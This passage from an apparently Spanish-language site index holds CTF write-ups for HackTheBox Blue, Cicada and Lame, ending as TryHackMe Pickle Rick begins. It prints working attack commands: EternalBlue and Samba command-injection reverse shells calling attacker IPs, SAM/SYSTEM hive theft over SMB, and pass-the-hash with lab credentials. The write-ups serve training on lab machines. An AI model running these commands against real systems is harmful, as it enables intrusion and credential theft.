vulnerabilidad con CVE de <code>CVE:CVE-2017-0143</code>.</p> <p>Podemos observar otros recursos de la maquina con <code>crackmapexec</code></p> <pre><code>\u276f crackmapexec smb $ip\nSMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)\n</code></pre>"},{"location":"writeups/hackthebox/machines/blue/#explotacion-utilizando-el-framework-de-metasploit","title":"Explotaci\u00f3n utilizando el framework de Metasploit","text":"<p>En este apartado vamos ayudarnos de la herramienta de <code>Metasploit</code>, para poder explotar esta maquina, realizamos la b\u00fasqueda de la vulnerabilidad en la base de datos de Metasploit.</p> <p></p> <p>Vamos a utilizar el <code>exploit 0</code>, y configuramos los par\u00e1metros necesarios para realizar el escalamiento.</p> <p></p> <p>Configuraci\u00f3n de los par\u00e1metros, con ayuda de Metasploit se logra tener una conexi\u00f3n al servidor, y lograr tener el respectivo acceso al sistemas.</p> <p></p> <p>Luego de obtener acceso a la maquina por medio de Metasploit, se puede observar que tenemos acceso a la l\u00ednea de comandos de Windows, con lo cual ahora podemos acceder a los diferentes directorios del sistema.</p> <p></p> <p>Navegamos  por los directorios del sistema, y logramos acceder como <code>Administrator</code> de Windows, obteniendo los m\u00e1ximos privilegios del sistema.</p> <p></p>"},{"location":"writeups/hackthebox/machines/blue/#explotacion-utilizando-script-de-python","title":"Explotaci\u00f3n utilizando script de Python","text":"<p>Para explotar la vulnerabilidad <code>Eternalblue</code> en sistemas operativos Windows 7, utilizaremos una aplicaci\u00f3n desarrollada en Python. Procederemos a analizar esta vulnerabilidad a continuaci\u00f3n y podr\u00e1s descargar la herramienta desde el siguiente repositorio.</p> <p>El exploit que nos ayudar\u00e1 a obtener acceso se llama <code>zzz_exploit.py</code>. Es importante tener en cuenta que la vulnerabilidad permite el acceso para un usuario an\u00f3nimo.</p> <p></p> <p>Al comprobar las ejecuci\u00f3n de comandos con python2 y tener instalados las diferentes herramientas, nos debe de arrojar las siguientes opciones, primer paso para la comprobaci\u00f3n de funcionamiento del script se debe de ejecutar <code>checker.py</code>, el cual nos arroja si el funcionamiento que se  va a realizar es correcto o no.</p> <p>Las librer\u00edas utilizadas son las siguientes, las cuales no est\u00e1n instaladas y deben de instalarse, se debe de utilizar python2 para poder ejecutar este script y las librer\u00edas de <code>impacket</code>, para el funcionamiento del script.</p> <p>La librer\u00eda de <code>impacket</code> es muy utilizada para poder interactuar con protocolos de red de bajo nivel, como en este caso de SMB.</p> <pre><code># importada dentro de los paquetes del repositorio para manejo de smb\nfrom mysmb import MYSMB\n# Utilizacion de libreria impacket\nfrom impacket import smb, smbconnection, nt_errors\nfrom impacket.uuid import uuidtup_to_bin\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\n</code></pre> <p></p> <p>Luego de configurar las dependencias debemos de hacer unos cambios al script <code>checker.py</code>, donde se deben de configurar algunas variables dentro del c\u00f3digo, para hacer ejecutar adecuadamente el script.</p> <p></p> <p>Ahora se puede observar que el funcionamiento del script ya nos arroja cosas positivas con las cuales podemos seguir avanzando en el escalamiento de privilegios, se obtiene varios <code>OK</code>, que ya nos permiten seguir avanzando, tenemos un namepy <code>samr</code> que podemos utilizarlo.</p> <p></p> <p>Para poder correr ahora el Exploit <code>zzz_exploit.py</code> para obtener acceso a la maquina , debemos de realizar los siguientes cambios, y agregar el usuario <code>guest</code> en la variable <code>USERNAME</code>.</p> <pre><code>#!/usr/bin/python\nfrom impacket import smb, smbconnection\nfrom mysmb import MYSMB\nfrom struct import pack, unpack, unpack_from\nimport sys\nimport socket\nimport time\n\n'''\nMS17-010 exploit for Windows 2000 and later by sleepya\n\nNote:\n- The exploit should never crash a target (chance should be nearly 0%)\n- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed\n\nTested on:\n- Windows 2016 x64\n- Windows 10 Pro Build 10240 x64\n- Windows 2012 R2 x64\n- Windows 8.1 x64\n- Windows 2008 R2 SP1 x64\n- Windows 7 SP1 x64\n- Windows 2008 SP1 x64\n- Windows 2003 R2 SP2 x64\n- Windows XP SP2 x64\n- Windows 8.1 x86\n- Windows 7 SP1 x86\n- Windows 2008 SP1 x86\n- Windows 2003 SP2 x86\n- Windows XP SP3 x86\n- Windows 2000 SP4 x86\n'''\n\nUSERNAME = 'guest'\nPASSWORD = '\n</code></pre> <p>Y modificar la funci\u00f3n <code>smb_pwn</code> con los siguientes cambios, donde se configurara la carga de un netcat para Windows y poder obtener el acceso al mismo tiempo que escuchamos desde nuestra maquina atacante con un netcat y por el puerto 443.</p> <pre><code>def smb_pwn(conn, arch):\n        smbConn = conn.get_smbconnection()\n\n  # Esta ejecucion de servicio nos permite cargar el archivo descargado de netcat para Windows y cargarlo en la maquina objetivo y ejecutarlo.\n        service_exec(conn, r'cmd /c \\\\10.10.14.7\\smbFolder\\nc.exe -e cmd 10.10.14.7 443')\n</code></pre> <p>Preparamos los ambientes de trabajo para trabajar con netcat, del siguiente link netcat windows y lo descargamos en la versi\u00f3n <code>netcat 1.12</code>.</p> <p>Al descomprimir estos archivos en el directorio de trabajo obtenemos los siguientes resultados.</p> <p></p> <p>Pasar los archivos desde la maquina de trabajo a la maquina objetivo</p> <pre><code>impacket-smbserver smbFolder $(pwd) -smb2support\n</code></pre> <p>Y tambi\u00e9n colocamos a escuchar un <code>netcat</code> en la maquina host</p> <pre><code>rlwrap nc -nlvp 443\n</code></pre> <p>Luego ejecutarnos nuestro Exploit para poder obtener los accesos a la maquina.</p> <pre><code>python2 zzz_exploit.py 10.10.10.40 samr\n</code></pre> <p>Finalmente se ha logrado obtener los privilegios de acceso dentro de la maquina Windows 7.</p> <p></p> <p>Al finalizar este proceso, se puede observar que esta vulnerabilidad de EternalBlue, nos permite tener acceso como usuario administrador <code>nt authority\\system</code>, con lo cual podemos proceder a tener una escalabilidad tanto horizontal dentro del sistema, proponiendo tener persistencia dentro de la maquina.</p>"},{"location":"writeups/hackthebox/machines/cicada/","title":"Cicada","text":""},{"location":"writeups/hackthebox/machines/cicada/#informacion-maquina","title":"Informaci\u00f3n maquina","text":"Par\u00e1metros Caracter\u00edsticas OS Windows Dificultad Easy Creador theblxckcicada Link Cicada <p>Tema contemplados</p> <p>Enumeraci\u00f3n y reconocimiento con <code>nmap</code>. Enumeraci\u00f3n de entornos de directorio. Ingenier\u00eda inversa, criptograf\u00eda. Reconocimiento de servicios de una maquina Windows.  </p>"},{"location":"writeups/hackthebox/machines/cicada/#requisitos-previos","title":"Requisitos previos","text":"<p>Para mantener una mayor facilidad a la hora de realizar un reconocimiento de la maquina vulnerable vamos a realizar la exportaci\u00f3n de la IP a una variable para poder hacer mas manejable este paso.</p> <pre><code>export ip=\"10.10.11.35\"\n</code></pre> <p>Se realiza una prueba de conectividad lanzando una traza de ICMP al host, con lo que se comprueba que es una maquina Windows por el <code>TTL</code> que esta por el rango de 128.</p> <p></p>"},{"location":"writeups/hackthebox/machines/cicada/#reconocimiento","title":"Reconocimiento","text":"<p>Se realiza el primer reconocimiento con <code>nmap</code>, para obtener la diferente informaci\u00f3n de los puertos que tenga abiertos.</p> <pre><code>sudo nmap -p- --open -n -Pn -sS --min-rate=5000 -vvv $ip -oN preScan\n</code></pre> <p>Resultados despu\u00e9s del reconocimiento de puertos con <code>nmap</code>.</p> <pre><code>Nmap scan report for 10.10.11.35\nHost is up, received user-set (0.13s latency).\nScanned at 2024-10-26 11:22:42 -05 for 27s\nNot shown: 65523 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE          REASON\n53/tcp    open  domain           syn-ack ttl 127\n88/tcp    open  kerberos-sec     syn-ack ttl 127\n135/tcp   open  msrpc            syn-ack ttl 127\n139/tcp   open  netbios-ssn      syn-ack ttl 127\n389/tcp   open  ldap             syn-ack ttl 127\n445/tcp   open  microsoft-ds     syn-ack ttl 127\n464/tcp   open  kpasswd5         syn-ack ttl 127\n593/tcp   open  http-rpc-epmap   syn-ack ttl 127\n636/tcp   open  ldapssl          syn-ack ttl 127\n3269/tcp  open  globalcatLDAPssl syn-ack ttl 127\n5985/tcp  open  wsman            syn-ack ttl 127\n52422/tcp open  unknown          syn-ack ttl 127\n\nRead data files from: /usr/share/nmap\n</code></pre> <p>Se identificaron m\u00faltiples puertos abiertos, entre ellos algunos ampliamente conocidos asociados a Active Directory, lo que sugiere que este servidor Windows podr\u00eda estar gestionando dicho servicio.</p> <p>Como tengo muchos puertos extraigo del escaneo los puertos, con el siguiente comando y obteniendo el resultado.</p> <pre><code>cat preScan | grep \"tcp\" | awk -F/ '{print $1}' | tail -n 12 | tr '\\n' ',' | rev | cut -c 2- | rev\n\n# 53,88,135,139,389,445,464,593,636,3269,5985,52422\n</code></pre> <p>Escaneo de los servicios y las versiones que est\u00e1n ejecut\u00e1ndose por los diferentes puertos.</p> <pre><code>sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3269,5985,52422 10.10.11.35 -oN scan\n</code></pre> <p>Reporte de salida del escaneo de todos los puertos.</p> <pre><code>Nmap scan report for 10.10.11.35\nHost is up (0.14s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-26 23:49:24Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n52422/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-10-26T23:50:18\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 7h00m00s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n</code></pre> <p>Se puede observar que algunos servicios est\u00e1n apuntando a un dominio <code>cicada.htb</code>, por lo tanto se proceder\u00eda a agregarlo a host del sistema para realizar estos reconocimientos, agregamos la IP y el dominio en <code>/etc/hosts</code>.</p> <pre><code>10.10.11.35  cicada.htb cicada.htb.local\n</code></pre> <p>Realizar un escaneo con crackmapexec, para sacar alg\u00fan dominio al que este apuntando el AD.</p> <pre><code>crackmapexec smb 10.10.11.35\n</code></pre> <p>se encuentra el dominio que se hab\u00eda visto anteriormente en la exploraci\u00f3n de los diferentes puestos que nos informaron que esta apuntando a un dominio de AD.</p> <p></p> <p>Probar el siguiente comando, para listar los recursos compartidos en la red del lado del servidor, para poder observar si la maquina esta compartiendo recursos en la red.</p> <pre><code>crackmapexec smb 10.10.11.35 --shares\n</code></pre> <p>Se tiene algunos errores al ingresar e intentamos ingresar con alg\u00fan usuario, en este caso vamos a  intentar con <code>guest</code>:</p> <pre><code>crackmapexec smb 10.10.11.35 --shares -u '' -p ''\ncrackmapexec smb 10.10.11.35 --shares -u 'guest' -p ''\n</code></pre> <p></p> <p>Seguimos enumerando algunos servicios con <code>smbclient</code> para el dominio de <code>cicada.htb</code></p> <pre><code>smbclient -L //cicada.htb\n</code></pre> <p>Al analizar con <code>smbclient</code>, encontramos dos directorios para analizar que se ven interesantes, los cuales son <code>DEV</code>, <code>HR</code>.</p> <p></p> <p>Enumeramos los directorios de DEV y HR para mirar si encontramos algo interesante.</p> <pre><code>1. smbclient -N //cicada.htb/DEV\n2. smbclient -N //cicada.htb/HR\n</code></pre> <p>Como se puede observar para DEV no tenemos permiso para ingresar, pero para HR, encontramos un archivo <code>Notice from HR.txt</code></p> <p></p> <p>Descargamos el archivo <code>Notice from HR.txt</code> y observamos su contenido.</p> <p></p> <p>El contenido del archivo contiene la siguiente informaci\u00f3n:</p> <pre><code>Dear new hire!\n\nWelcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.\n\nYour default password is: Cicada$M6Corpb*@Lp#nZp!8\n\nTo change your password:\n\n1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.\n2. Once logged in, navigate to your account settings or profile settings section.\n3. Look for the option to change your password. This will be labeled as \"Change Password\".\n4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.\n5. After changing your password, make sure to save your changes.\n\nRemember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.\n\nIf you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.\n\nThank you for your attention to this matter, and once again, welcome to the Cicada Corp team!\n\nBest regards,\nCicada Corp\n</code></pre> <p>Se identific\u00f3 una credencial por defecto (Cicada$M6Corpb*@Lp#nZp!8), la cual podr\u00eda ser utilizada para acceder a alg\u00fan recurso del sistema.</p> <p>Seguimos con la realizaci\u00f3n de encontrar mas informaci\u00f3n por parte del usuario <code>guest</code>, con lo que se procede a realizar un an\u00e1lisis con fuerza bruta para observar que se encuentra.</p> <pre><code>crackmapexec smb cicada.htb -u \"guest\" -p '' --rid-brute\n</code></pre> <p>Se encuentra varias informaci\u00f3n y varios posibles usuarios, se agregan a una lista de usuario para poder seguir analizando y poder tener acceso al sistema.</p> <p></p> <p>Realizamos un filtro para obtener los usuarios que podemos utilizar en esta lista y luego realizar un ataque de fuerza bruta con estos usuarios, para mirar si se logra obtener acceso con alguno.</p> <pre><code>crackmapexec smb cicada.htb -u \"guest\" -p '' --rid-brute | grep \"SidTypeUser\"\n</code></pre> <p></p> <p>Se crea un listado de los posibles usuarios.</p> <p></p> <p>Se proceder\u00e1 a realizar una enumeraci\u00f3n con los usuarios identificados, con el objetivo de obtener informaci\u00f3n adicional o identificar un usuario v\u00e1lido para el sondeo, utilizando la credencial por defecto encontrada.</p> <pre><code>nxc smb cicada.htb -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'\n</code></pre> <p>Al realizar el escaneo encontramos que el \u00fanico usuario que se logra tener un acceso por SMB es <code>michael.wrightson</code></p> <p></p> <p>Realizamos una enumeraci\u00f3n con la herramienta <code>enum4linux-ng</code> para este equipo de Windows sobre el servicio de SMB,  y poder encontrar algo mas de informaci\u00f3n sobre el sistema.</p> <pre><code>enum4linux-ng -A -u 'Michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35\n</code></pre> <p>Se encuentra un usuario  mas en esta enumeraci\u00f3n, usuario <code>david.orelious</code> y su password <code>aRt$Lp#7t*VQ!3</code>, con el que procedemos a averiguar en alg\u00fan servicio de SMB si podemos escalar mas privilegios.</p> <p></p> <p>Con la herramienta de <code>smbclient</code> seguimos explorando si logramos acceder alg\u00fan recurso compartido de DEV, que antes no logramos tener acceso.</p> <pre><code>smbclient //cicada.htb/DEV -U david.orelious%'aRt$Lp#7t*VQ!3'\n</code></pre> <p>Se logra ingresar a los archivos compartidos para el usuario y se encuentra un archivo <code>Backup_script.ps1</code> que se procede a descargar a la maquina host y proceder a analizar que contiene.</p> <p></p> <p>En este archivo se logra obtener otro usuario que contiene tambi\u00e9n una credencial.</p> <p></p> <p>Ahora con esta nueva contrase\u00f1a ingresada en nuestro diccionario de password, realizamos otra vez el comando <code>crackmapexec</code>.</p> <pre><code>crackmapexec smb cicada.htb -u users -p pass --continue-on-success\n</code></pre> <p>Se puede observar que efectivamente este usuario y contrase\u00f1a son validos para <code>smb</code>.</p> <p></p> <p>Ahora vamos a probar otro protocolo para ver si tenemos alg\u00fan acceso con estos usuario y contrase\u00f1as que se encontraron.</p> <pre><code>crackmapexec winrm cicada.htb -u users -p pass --continue-on-success\n</code></pre> <p>Se logra observar que con el servicio de <code>winrm</code>, logramos tener un acceso al sistemas, con el usuario <code>emily.oscars</code> y password <code>Q!3@Lp#M6b*7t*Vt</code></p> <p></p> <p>Ahora nos conectamos al sistema para poder ingresar al sistema con la herramienta de <code>evil-winrm</code></p> <pre><code>evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'\n</code></pre> <p>Se ha logrado acceder a la maquina con el usuario de <code>emily.oscars</code>.</p> <p></p> <p>Obtenemos la flag del usuario respectivo.</p> <p></p> <p>Se lista los diferentes grupos y permisos que tiene el usuario sobre el sistemas, y los cuales nos van a servir para realizar la escalar privilegios.</p> <p></p> <p></p>"},{"location":"writeups/hackthebox/machines/cicada/#escalamiento-de-privilegios","title":"Escalamiento de privilegios","text":"<p>Vamos a escalar privilegios, gracias a este servicio <code>SeBackupPrivilege</code>,  y vamos a revisar la informaci\u00f3n del siguiente articulo para poder escalar privilegios hackingarticlesse utiliza los siguiente comandos para poder sacar el <code>sam</code> del sistema y el <code>system</code>.</p> <pre><code>reg save hklm\\sam samR\nreg save hklm\\system systemR\n</code></pre> <p>Despu\u00e9s de ejecutar estos los comandos me quedan dos archivos donde contengo la informaci\u00f3n del sistema.</p> <p></p> <p>Ahora se procede a pasar los archivos generados a la maquina host para proceder a analizar la informaci\u00f3n de cada archivo.</p> <pre><code>sudo impacket-smbserver KzFFile . -smb2support\n</code></pre> <p>Se enviar los archivo <code>samR</code> y <code>systemR</code> desde Windows a la maquina host.</p> <pre><code>copy samR \\\\10.10.14.100\\KzFFile\\samR\ncopy systemR \\\\10.10.14.100\\KzFFile\\systemR\n</code></pre> <p>Se realiza la explotaci\u00f3n con <code>impacket</code> para ver lo archivos que fueron copiados y revisar que contienen, pero va hacer en LOCAL.</p> <pre><code>impacket-secretsdump -sam samR -system systemR LOCAL\n</code></pre> <p>Con esa informaci\u00f3n miramos que obtenemos los hash NTLM, pero lo interesante es que obtenemos el Hash NTLM del usuario <code>Administrator</code>.</p> <p></p> <p>Ahora con el hash NTLM y utilizando <code>evil-winrm</code> con la parte del hash LM la usamos para conectarnos a la cuenta del usuario <code>Administrator</code>.</p> <pre><code>evil-winrm -i cicada.htb -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'\n</code></pre> <p>Se ha logrado acceder a la maquina con el usuario <code>Administrator</code>, obteniendo los altos privilegios sobre la maquina, utilizando la t\u00e9cnica de <code>pass-the-hash</code>.</p> <p></p> <p>La flag al finalizar la escalaci\u00f3n de privilegios.</p> <p></p> <p>Finalizaci\u00f3n de la maquina Cicada por <code>KrozFu</code></p> <p></p>"},{"location":"writeups/hackthebox/machines/lame/","title":"Lame","text":""},{"location":"writeups/hackthebox/machines/lame/#informacion-maquina","title":"Informaci\u00f3n maquina","text":"Par\u00e1metros Caracter\u00edsticas OS Linux Dificultad Easy Creador ch4p Link Lame"},{"location":"writeups/hackthebox/machines/lame/#skill","title":"Skill","text":"<ul> <li>Identificaci\u00f3n de servicios vulnerables</li> <li>Explotaci\u00f3n de Samba</li> </ul>"},{"location":"writeups/hackthebox/machines/lame/#introduccion","title":"Introducci\u00f3n","text":"<p>En esta maquina vamos a ver como se podr\u00eda explotar para poder tener los privilegios de administrador del sistema, con lo que vamos a reconocer los diferentes puertos de la maquina y luego buscar alguna vulnerabilidad que nos pueda dar acceso a la maquina.</p>"},{"location":"writeups/hackthebox/machines/lame/#requisitos-previos","title":"Requisitos previos","text":"<p>Vamos a crear unos directorios de trabajo, para poder manejar mucho mejor la informaci\u00f3n que vamos obteniendo y manteniendo un orden, con la ejecuci\u00f3n de los siguiente comandos.</p> <pre><code>&gt; mkdir 1.recon 2.vulns 3.tools 4.credentials 5.other\n&gt; export ip=\"10.10.10.3\"\n</code></pre> <p>Ya configurada las opciones realizamos un env\u00edo de una traza ICMP para comprobar la conectividad con la maquina, y con lo cual observamos que ya tenemos conectividad y que tiene un <code>ttl=63</code> que hace perteneciente a una maquina con sistema operativo Linux.</p> <p></p>"},{"location":"writeups/hackthebox/machines/lame/#reconocimiento","title":"Reconocimiento","text":"<p>Realizamos ahora un reconocimiento de los puertos que tenga abierta esta maquina, con la ejecuci\u00f3n del siguiente comando.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -Pn -n -sS -vvv $ip -oN preScan\n</code></pre> <p>El escaneo nos arrojo que est\u00e1n abierto los siguiente puertos donde, se pueden observar que son los puerto <code>21,22,139,445,3632</code>, pertenecientes a sus respectivos servicios.</p> <pre><code>Nmap scan report for 10.10.10.3\nHost is up, received user-set (0.11s latency).\nScanned at 2024-07-15 17:13:39 EDT for 27s\nNot shown: 65530 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE      REASON\n21/tcp   open  ftp          syn-ack ttl 63\n22/tcp   open  ssh          syn-ack ttl 63\n139/tcp  open  netbios-ssn  syn-ack ttl 63\n445/tcp  open  microsoft-ds syn-ack ttl 63\n3632/tcp open  distccd      syn-ack ttl 63\n</code></pre> <p>Realizamos el siguiente paso donde vamos a observar algunos script y vulnerabilidades que pueden tener estos puertos por los cuales se logre tener acceso y realizamos el siguiente comando.</p> <pre><code>sudo nmap -sCV -p21,22,139,445,3632 $ip -oN scan\n</code></pre> <p>Donde se tiene mas especificaciones sobre los servicios y las versiones que est\u00e1n corriendo por estos puertos.</p> <pre><code>Nmap scan report for 10.10.10.3\nHost is up (0.11s latency).\n\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.39\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 2h00m22s, deviation: 2h49m47s, median: 18s\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2024-07-15T17:17:56-04:00\n</code></pre>"},{"location":"writeups/hackthebox/machines/lame/#enumeracion-por-ftp","title":"Enumeraci\u00f3n por FTP","text":"<p>Se puede observar que por el puerto 21, esta corriendo un servicio de <code>ftp</code> y que tiene acceso con el usuario <code>Anonymous</code> que es un usuario que no suele pedir credenciales de acceso, con lo cual podemos observar una primera instancia si se puede recolectar informaci\u00f3n a trav\u00e9s de este puerto.</p> <p></p> <p>Se observa que por el puerto de ftp no tenemos ning\u00fan archivo que nos puede servir para poder encontrar algo de informaci\u00f3n, entonces procedemos a reconocer el siguiente puerto.</p>"},{"location":"writeups/hackthebox/machines/lame/#enumeracion-por-smb","title":"Enumeraci\u00f3n por SMB","text":"<p>Procedemos a realizar una an\u00e1lisis por el puertos que esta corriendo samba que son los puertos 139, 445 y vamos a utlizar una herramienta que viene instalada en Kali Linux y es <code>smbmap</code> y realizamos el siguiente comando para enumerar alguna vulnerabilidad.</p> <pre><code>smbmap -H $ip\n</code></pre> <p></p> <p>Y observamos que el directorio <code>tmp</code> es accesible, y podemos leer y escribir dentro de este directorio, con lo que vamos a conectarnos a este recurso, ejecutamos el siguiente comando, y no colocamos ninguna credencial.</p> <pre><code>smbclient //$ip/tmp\n</code></pre> <p></p> <p>Se logran observar varios archivos, con los que podemos ir analizando cada unos para ver si encontramos algunas informaci\u00f3n que nos sea relevante para escalar privilegios, pero para este caso estos archivos no van hacer relevantes y vamos a proceder con otro paso que puede que nos ayude a escalar privilegios.</p> <p>Vamos a buscar alguna vulnerabilidad con la versi\u00f3n de smb, <code>smbd 3.0.20-Debian</code></p> <pre><code>searchsploit samba 3.0.20\n</code></pre> <p>Y logramos obtener algunas vulnerabilidades con esta versi\u00f3n de samba, y lo que se desea hacer con la maquina victima es tener acceso para poder ejecutar comando dentro de esta maquina utilizamos el script de <code>Command Execution</code>, vamos a analizar este script para poder ver como se lograr\u00eda tener el acceso de privilegios.</p> <p></p> <p>Vamos a explorar que tiene este c\u00f3digo y que nos puede servir de este script de ruby, ejecutando el siguiente comando.</p> <pre><code>searchsploit -x unix/remote/16320.rb\n</code></pre> <p>Se observa que en esa linea de c\u00f3digo ejecuta lo siguiente para poder tener acceso de super usuario en la maquina.</p> <p></p> <p>Vamos a probar esa vulnerabilidad para comprabar si funciona al realizar la conexion encontrada con smbmap.</p> <pre><code>smbclient //$ip/tmp\n</code></pre> <p>Realizamos la siguiente petici\u00f3n para probar si nos funciona el c\u00f3digo, realizando un env\u00edo de una traza ICMP.</p> <pre><code>logon \"/=`nohup ping 10.10.14.39`\"\n</code></pre> <p>Y en segundo plano colocamos a escuchar el siguiente comando.</p> <pre><code>sudo tcpdump -i tun0 icmp\n</code></pre> <p>Y como se puede comprobar se tiene ejecuci\u00f3n de c\u00f3digo remoto a trav\u00e9s de la maquina entonces procedemos a explotar esta vulnerabilidad.</p> <p></p> <p>Ahora ejecutamos el siguiente comando para poder tener un acceso remoto a la maquina a trav\u00e9s de una <code>revershell</code>.</p> <pre><code>logon \"/=`nohup nc -e /bin/sh 10.10.14.39 443`\"\n</code></pre> <p>Y colocamos a escuchar otra shell con el siguiente comando.</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Y se puede observar que ya se tiene colectividad con usuario <code>root</code>, se logro tener conectiviad con una revershell.</p> <p></p> <p>Se realiza un tratamiento de tty para poder trabajar de una manera mas amigable y realizamos los siguientes comandos en el siguiente orden.</p> <pre><code>1. script /dev/null -c bash\n2. ctrl + z\n3. stty raw -echo; fg\n4. reset xterm\n6. export TERM=xterm\n7. export SHELL=bash\n</code></pre> <p>Y se puede observar que ya es mas manejable la terminar para proceder a buscar las flags.</p> <p></p> <p>Y realizamos la b\u00fasqueda de las flag y se encuentra las diferentes direcciones donde podemos ir a buscarlas y terminal la maquina.</p> <p></p>"},{"location":"writeups/hackthebox/machines/lame/#finalizacion","title":"Finalizacion","text":"<p>Se pudo observar que esta maquina logramos obtener privilegios de usuario root a traves de una vulnerabilidad de samba, que nos dejo ejecutar un comando de revershell para obtener este acceso y obtener el acceso completo a la maquina.</p> <p></p>"},{"location":"writeups/tryhackme/pickle-rick/","title":"Informaci\u00f3n Box","text":"Par\u00e1metros Caracter\u00edsticas OS Linux Dificultad Easy Creador ar33zy Link Pickle Rick"},{"location":"writeups/tryhackme/pickle-rick/#introduccion","title":"Introducci\u00f3n","text":"<p>Esta es una maquina de la plataforma de TryHackMe donde se puede realizar diferentes CTF para poder practicar y hacer an\u00e1lisis de Pentesting, esta maquina es de dificulta f\u00e1cil, con lo cual vamos a explorar las diferentes fases de un an\u00e1lisis de Pentesting.</p>"},{"location":"writeups/tryhackme/pickle-rick/#requisitos-previos","title":"Requisitos previos","text":"<p>Creamos directorios para poder almacenar los diferentes archivos que se trabajan en la maquina, y asignamos a una variable en Linux la direcci\u00f3n IP de la maquina, para mayor facilidad de trabajo.</p> <pre><code>&gt; mkdir nmap content script exploits\n&gt; export rick=\"10.10.110.194\"\n</code></pre>"},{"location":"writeups/tryhackme/pickle-rick/#reconocimiento-de-informacion-y-enumeracion","title":"Reconocimiento de informaci\u00f3n y enumeraci\u00f3n","text":"<p>Para proceder a analizar los diferentes puertos abiertos abiertos la maquina realizamos el reconocimiento de los diferentes puertos con la herramienta de <code>nmap</code>, donde podemos observar, que tipo de servicios pueden ser vulnerables.</p> <pre><code>sudo nmap -p- -sV -sC --open -sS -vvv -Pn 